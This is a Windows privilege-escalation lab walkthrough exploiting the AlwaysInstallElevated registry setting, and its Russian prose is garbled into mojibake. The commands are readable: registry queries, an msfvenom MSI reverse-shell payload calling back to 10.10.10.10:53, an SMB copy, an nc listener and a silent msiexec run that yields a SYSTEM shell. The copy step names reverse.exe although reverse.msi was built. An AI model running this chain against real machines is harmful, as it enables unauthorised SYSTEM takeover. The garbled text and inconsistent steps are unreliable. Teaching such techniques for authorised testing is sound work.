# üêæ 8. –†–µ–µ—Å—Ç—Ä - AlwaysInstallElevated
---
## üìú –û–ø–∏—Å–∞–Ω–∏–µ –∑–∞–¥–∞–Ω–∏—è
–í —ç—Ç–æ–º –∑–∞–¥–∞–Ω–∏–∏ –º—ã –∏—Å—Å–ª–µ–¥—É–µ–º —É—è–∑–≤–∏–º–æ—Å—Ç—å, —Å–≤—è–∑–∞–Ω–Ω—É—é —Å –∫–ª—é—á–æ–º —Ä–µ–µ—Å—Ç—Ä–∞ `AlwaysInstallElevated`. –≠—Ç–æ—Ç –∫–ª—é—á –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å —É—Å—Ç–∞–Ω–æ–≤—â–∏–∫–∏ —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ SYSTEM, –¥–∞–∂–µ –µ—Å–ª–∏ –æ–Ω–∏ –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏. –ú—ã –≤–æ—Å–ø–æ–ª—å–∑—É–µ–º—Å—è —ç—Ç–∏–º –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ —à–µ–ª–ª–∞ —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ SYSTEM, –∏—Å–ø–æ–ª—å–∑—É—è Windows Installer.

---
## üîç –®–∞–≥ 1: –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–ª—é—á–µ–π —Ä–µ–µ—Å—Ç—Ä–∞
–°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–≤–µ—Ä–∏–º, —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã –ª–∏ –∑–Ω–∞—á–µ–Ω–∏—è –≤ —Ä–µ–µ—Å—Ç—Ä–µ –¥–ª—è –∫–ª—é—á–µ–π `AlwaysInstallElevated`. –í—ã–ø–æ–ª–Ω–∏—Ç–µ —Å–ª–µ–¥—É—é—â–∏–µ –∫–æ–º–∞–Ω–¥—ã:
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

### üìã –û–∂–∏–¥–∞–µ–º—ã–π –≤—ã–≤–æ–¥
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –æ–±–∞ –∫–ª—é—á–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã –≤ `1` (0x1), —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å —É—Å—Ç–∞–Ω–æ–≤—â–∏–∫–∏ —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ SYSTEM.
![image](https://github.com/user-attachments/assets/3c48a59a-a572-433b-9279-45cd39ec1312)

## üîë –®–∞–≥ 2: –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ —à–µ–ª–ª–∞ —Å –ø–æ–º–æ—â—å—é msfvenom
–¢–µ–ø–µ—Ä—å –∏—Å–ø–æ–ª—å–∑—É–µ–º `msfvenom` –Ω–∞ Kali –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —É—Å—Ç–∞–Ω–æ–≤–æ—á–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ `.msi` —Å –æ–±—Ä–∞—Ç–Ω—ã–º —à–µ–ª–ª–æ–º. –í—ã–ø–æ–ª–Ω–∏—Ç–µ —Å–ª–µ–¥—É—é—â—É—é –∫–æ–º–∞–Ω–¥—É:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`

### üìã –û–∂–∏–¥–∞–µ–º—ã–π –≤—ã–≤–æ–¥
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —Ñ–∞–π–ª `reverse.msi` —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω.

## üìù –®–∞–≥ 3: –ü–µ—Ä–µ–Ω–æ—Å —Ñ–∞–π–ª–∞ –Ω–∞ Windows
–¢–µ–ø–µ—Ä—å –ø–µ—Ä–µ–Ω–µ—Å–µ–º —Å–æ–∑–¥–∞–Ω–Ω—ã–π —Ñ–∞–π–ª `reverse.msi` –Ω–∞ —Ü–µ–ª–µ–≤—É—é –º–∞—à–∏–Ω—É Windows –≤ –∫–∞—Ç–∞–ª–æ–≥ `C:\PrivEsc`. –ò—Å–ø–æ–ª—å–∑—É–µ–º SMB —Å–µ—Ä–≤–µ—Ä –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ —Ñ–∞–π–ª–∞:

1. –ù–∞ Kali –∑–∞–ø—É—Å—Ç–∏—Ç–µ SMB —Å–µ—Ä–≤–µ—Ä, –µ—Å–ª–∏ —ç—Ç–æ –µ—â–µ –Ω–µ —Å–¥–µ–ª–∞–Ω–æ.
2. –°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Ñ–∞–π–ª —Å Kali –Ω–∞ Windows:
   `copy \\LHOST\kali\reverse.exe C:\PrivEsc\reverse.exe`

### üìã –û–∂–∏–¥–∞–µ–º—ã–π –≤—ã–≤–æ–¥
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —Ñ–∞–π–ª —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–Ω–µ—Å–µ–Ω –≤ –∫–∞—Ç–∞–ª–æ–≥ `C:\PrivEsc`.

## üéß –®–∞–≥ 4: –ó–∞–ø—É—Å–∫ —Å–ª—É—à–∞—Ç–µ–ª—è
–ü–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º —É—Å—Ç–∞–Ω–æ–≤—â–∏–∫–∞ —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —É –≤–∞—Å –∑–∞–ø—É—â–µ–Ω —Å–ª—É—à–∞—Ç–µ–ª—å –Ω–∞ Kali. –í—ã–ø–æ–ª–Ω–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É:
`nc -lvnp 53`

## üöÄ –®–∞–≥ 5: –ó–∞–ø—É—Å–∫ —É—Å—Ç–∞–Ω–æ–≤—â–∏–∫–∞
–¢–µ–ø–µ—Ä—å –º—ã –º–æ–∂–µ–º –∑–∞–ø—É—Å—Ç–∏—Ç—å —É—Å—Ç–∞–Ω–æ–≤—â–∏–∫ `reverse.msi`, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–ø–æ–ª–Ω–∏—Ç –æ–±—Ä–∞—Ç–Ω—ã–π —à–µ–ª–ª —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ SYSTEM. –í—ã–ø–æ–ª–Ω–∏—Ç–µ —Å–ª–µ–¥—É—é—â—É—é –∫–æ–º–∞–Ω–¥—É –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ Windows:
`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`

### üìã –û–∂–∏–¥–∞–µ–º—ã–π –≤—ã–≤–æ–¥
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—ã –ø–æ–ª—É—á–∏–ª–∏ –æ–±—Ä–∞—Ç–Ω—ã–π —à–µ–ª–ª —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ SYSTEM –Ω–∞ Kali.
![image](https://github.com/user-attachments/assets/b0432081-ff06-4f95-a508-dc09c1b2313e)

## üéâ –ü–æ–∑–¥—Ä–∞–≤–ª–µ–Ω–∏—è!
–í—ã —É—Å–ø–µ—à–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ —É—è–∑–≤–∏–º–æ—Å—Ç—å –≤ —Ä–µ–µ—Å—Ç—Ä–µ `AlwaysInstallElevated` –¥–ª—è –∑–∞–ø—É—Å–∫–∞ —É—Å—Ç–∞–Ω–æ–≤—â–∏–∫–∞ —Å –ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏ SYSTEM –∏ –ø–æ–ª—É—á–µ–Ω–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ —à–µ–ª–ª–∞! üéä

## üìå –ü—Ä–∏–º–µ—á–∞–Ω–∏—è
- –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –≤—ã –ø–æ–Ω–∏–º–∞–µ—Ç–µ –≤—Å–µ —à–∞–≥–∏ –∏ –∏—Ö –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è.
- –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø–æ–ª—É—á–µ–Ω–Ω—ã–µ –∑–Ω–∞–Ω–∏—è –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ –∏ —Ç–æ–ª—å–∫–æ –≤ —Ä–∞–º–∫–∞—Ö —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö —Ç–µ—Å—Ç–æ–≤ –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏–µ.
